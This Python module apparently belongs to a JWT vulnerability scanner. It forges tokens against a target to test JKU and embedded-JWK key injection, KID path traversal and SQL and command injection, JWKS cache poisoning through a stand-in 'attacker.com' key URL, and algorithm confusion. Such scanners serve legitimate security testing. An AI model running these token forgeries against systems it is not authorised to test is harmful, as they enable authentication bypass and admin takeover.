import json
import base64
import time
import http.server
import socketserver
import threading
from urllib.parse import urljoin

from ..enums import _kurtVuln_list
from ..models import jq_vuln_list


def generate_rsa_keypair():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend

    priv_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_key = priv_key.public_key()

    private_pem = priv_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    numbers = public_key.public_numbers()
    n = (
        base64.urlsafe_b64encode(
            numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
        )
        .decode()
        .rstrip("=")
    )
    e = (
        base64.urlsafe_b64encode(
            numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")
        )
        .decode()
        .rstrip("=")
    )

    jwk = {"keys": [{"kty": "RSA", "kid": "injected-key", "n": n, "e": e}]}
    return private_pem, jwk


def test_jku_injection(scanner) -> None:
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing JKU header injection...{Style.RESET_ALL}")

    if not scanner.header.get("alg", "").startswith("RS"):
        return

    PORT = 9082
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), handler, bind_and_activate=False)
    httpd.allow_reuse_address = True
    httpd.server_bind()
    httpd.server_activate()

    def run_server():
        httpd.handle_request()

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    malicious_jku = f"http://127.0.0.1:{PORT}/jwks.json"
    payload_header = scanner.header.copy()
    payload_header["jku"] = malicious_jku

    priv_key, pub_key = generate_rsa_keypair()
    forged_token = jwt.encode(
        scanner.payload, priv_key, algorithm="RS256", headers=payload_header
    )

    response = scanner.make_request(
        scanner.target_url, forged_token, delay=scanner.delay
    )
    time.sleep(2)

    if hasattr(httpd, "request_received") or httpd.__dict__.get("requests", 0) > 0:
        vuln = jq_vuln_list(
            type=_kurtVuln_list.JKU_INJECTION,
            severity="HIGH",
            description="Server fetches keys from untrusted JKU URL",
            exploit_payload=malicious_jku,
            proof="Outgoing request detected to attacker-controlled server",
            endpoint=scanner.target_url,
            chainable_with=[_kurtVuln_list.JWK_INJECTION],
            cve_reference="CVE-2018-0114",
            cvss_score=8.2,
        )
        scanner.vulnerabilities.append(vuln)
        print(
            f"{Fore.RED}[!] JKU injection possible! Server attempts to fetch from external URL.{Style.RESET_ALL}"
        )
    else:
        print(f"{Fore.GREEN}[-] Not vulnerable to JKU injection{Style.RESET_ALL}")

    httpd.server_close()


def test_jwk_injection(scanner) -> None:
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing JWK embedded key injection...{Style.RESET_ALL}")

    try:
        priv_key, pub_key = generate_rsa_keypair()

        payload_header = scanner.header.copy()
        payload_header["jwk"] = pub_key["keys"][0]

        payload = scanner.payload.copy()
        payload["sub"] = "administrator"
        forged_token = jwt.encode(
            payload, priv_key, algorithm="RS256", headers=payload_header
        )

        response = scanner.make_request(
            scanner.target_url, forged_token, delay=scanner.delay
        )

        if response.status_code == 200 and "admin" in response.text.lower():
            vuln = jq_vuln_list(
                type=_kurtVuln_list.JWK_INJECTION,
                severity="CRITICAL",
                description="Server accepts embedded JWK in header",
                exploit_payload=forged_token,
                proof="Successfully accessed admin area with self-signed key",
                endpoint=scanner.target_url,
                chainable_with=[_kurtVuln_list.JKU_INJECTION],
                cvss_score=9.0,
            )
            scanner.vulnerabilities.append(vuln)
            print(f"{Fore.RED}[!] JWK injection successful!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[-] Not vulnerable to JWK injection{Style.RESET_ALL}")
    except Exception as e:
        if scanner.verbose:
            print(f"{Fore.RED}[ERROR] JWK test failed: {e}{Style.RESET_ALL}")


def test_kid_injection(scanner) -> None:
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing KID header injection...{Style.RESET_ALL}")

    if "kid" not in scanner.header:
        print(
            f"{Fore.YELLOW}[-] No 'kid' header present, skipping KID tests{Style.RESET_ALL}"
        )
        return

    for payload in scanner.kid_traversal_payloads:
        try:
            payload_header = scanner.header.copy()
            payload_header["kid"] = payload

            null_secret = b"\x00"
            forged_token = jwt.encode(
                scanner.payload, null_secret, algorithm="HS256", headers=payload_header
            )

            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )

            if (
                response.status_code == 200
                and "unauthorized" not in response.text.lower()
            ):
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.KID_PATH_TRAVERSAL,
                    severity="HIGH",
                    description=f"KID path traversal with payload: {payload}",
                    exploit_payload=payload,
                    proof=f"Accepted token with KID pointing to {payload}",
                    endpoint=scanner.target_url,
                    chainable_with=[
                        _kurtVuln_list.KID_SQL_INJECTION,
                        _kurtVuln_list.KID_COMMAND_INJECTION,
                    ],
                    cvss_score=8.6,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.RED}[!] KID path traversal found! Payload: {payload}{Style.RESET_ALL}"
                )
                break
        except Exception:
            continue

    for payload in scanner.kid_sql_payloads:
        try:
            payload_header = scanner.header.copy()
            payload_header["kid"] = payload
            forged_token = jwt.encode(
                scanner.payload, "dummy", algorithm="HS256", headers=payload_header
            )

            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )

            if (
                response.status_code == 500
                or "SQL" in response.text
                or "mysql" in response.text.lower()
            ):
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.KID_SQL_INJECTION,
                    severity="CRITICAL",
                    description=f"KID SQL injection possible with payload: {payload}",
                    exploit_payload=payload,
                    proof=f"Server error indicates SQL injection: {response.text[:200]}",
                    endpoint=scanner.target_url,
                    chainable_with=[_kurtVuln_list.KID_PATH_TRAVERSAL],
                    cvss_score=9.0,
                )
                scanner.vulnerabilities.append(vuln)
                print(
                    f"{Fore.RED}[!] KID SQL injection found! Payload: {payload}{Style.RESET_ALL}"
                )
                break
        except Exception:
            continue

    for payload in scanner.kid_cmd_payloads:
        try:
            payload_header = scanner.header.copy()
            payload_header["kid"] = payload
            forged_token = jwt.encode(
                scanner.payload, "dummy", algorithm="HS256", headers=payload_header
            )

            start = time.time()
            response = scanner.make_request(
                scanner.target_url, forged_token, delay=scanner.delay
            )
            elapsed = time.time() - start

            if elapsed > 5:
                vuln = jq_vuln_list(
                    type=_kurtVuln_list.KID_COMMAND_INJECTION,
                    severity="CRITICAL",
                    description=f"KID command injection possible (timing delay)",
                    exploit_payload=payload,
                    proof=f"Response delayed {elapsed:.2f}s",
                    endpoint=scanner.target_url,
                    chainable_with=[_kurtVuln_list.KID_SQL_INJECTION],
                    cvss_score=9.8,
                )
                scanner.vulnerabilities.append(vuln)
                print(f"{Fore.RED}[!] KID command injection found!{Style.RESET_ALL}")
                break
        except Exception:
            continue


def test_jwks_cache_poisoning(scanner) -> None:
    from colorama import Fore, Style
    import jwt

    print(f"\n{Fore.YELLOW}[*] Testing JWKS cache poisoning...{Style.RESET_ALL}")

    if not scanner.jwks_uri:
        print(
            f"{Fore.YELLOW}[-] No JWKS URI known, skipping cache poisoning test{Style.RESET_ALL}"
        )
        return

    priv_key, pub_key = generate_rsa_keypair()
    malicious_jku = "http://attacker.com/jwks.json"

    modified_header = scanner.header.copy()
    modified_header["jku"] = malicious_jku
    forged_token = jwt.encode(
        scanner.payload, priv_key, algorithm="RS256", headers=modified_header
    )

    response = scanner.make_request(
        scanner.target_url, forged_token, delay=scanner.delay
    )

    if any(v.type == _kurtVuln_list.JKU_INJECTION for v in scanner.vulnerabilities):
        vuln = jq_vuln_list(
            type=_kurtVuln_list.JWKS_CACHE_POISONING,
            severity="HIGH",
            description="Potential JWKS cache poisoning (JKU injection confirmed)",
            exploit_payload="Inject malicious JWKS via JKU, then use that key to sign tokens",
            proof="JKU injection confirmed, so cache poisoning may be possible",
            endpoint=scanner.target_url,
            chainable_with=[_kurtVuln_list.JKU_INJECTION],
            cve_reference="CVE-2025-59936",
            cvss_score=8.5,
        )
        scanner.vulnerabilities.append(vuln)
        print(
            f"{Fore.RED}[!] JWKS cache poisoning possible (based on JKU injection){Style.RESET_ALL}"
        )


def test_jwk_missing_alg(scanner) -> None:
    from colorama import Fore, Style
    import jwt

    print(
        f"\n{Fore.YELLOW}[*] Testing JWK missing alg confusion (CVE-2026-22818)...{Style.RESET_ALL}"
    )

    if not scanner.public_keys:
        print(f"{Fore.YELLOW}[-] No public keys to test with{Style.RESET_ALL}")
        return

    priv_key, pub_key = generate_rsa_keypair()

    if "alg" in pub_key["keys"][0]:
        del pub_key["keys"][0]["alg"]

    modified_header = scanner.header.copy()
    modified_header["jwk"] = pub_key["keys"][0]
    modified_header["alg"] = "HS256"

    forged_token = jwt.encode(
        scanner.payload, priv_key, algorithm="RS256", headers=modified_header
    )
    response = scanner.make_request(
        scanner.target_url, forged_token, delay=scanner.delay
    )

    if response.status_code == 200 and "unauthorized" not in response.text.lower():
        vuln = jq_vuln_list(
            type=_kurtVuln_list.JWK_MISSING_ALG_CONFUSION,
            severity="HIGH",
            description="Algorithm confusion via JWK missing alg (server falls back to header alg)",
            exploit_payload="JWK without alg + HS256 header",
            proof=f"Token accepted with forged key",
            endpoint=scanner.target_url,
            chainable_with=[_kurtVuln_list.ALGORITHM_CONFUSION],
            cve_reference="CVE-2026-22818",
            cvss_score=8.2,
        )
        scanner.vulnerabilities.append(vuln)
        print(f"{Fore.RED}[!] JWK missing alg confusion possible!{Style.RESET_ALL}")
    else:
        print(
            f"{Fore.GREEN}[-] Not vulnerable to JWK missing alg confusion{Style.RESET_ALL}"
        )
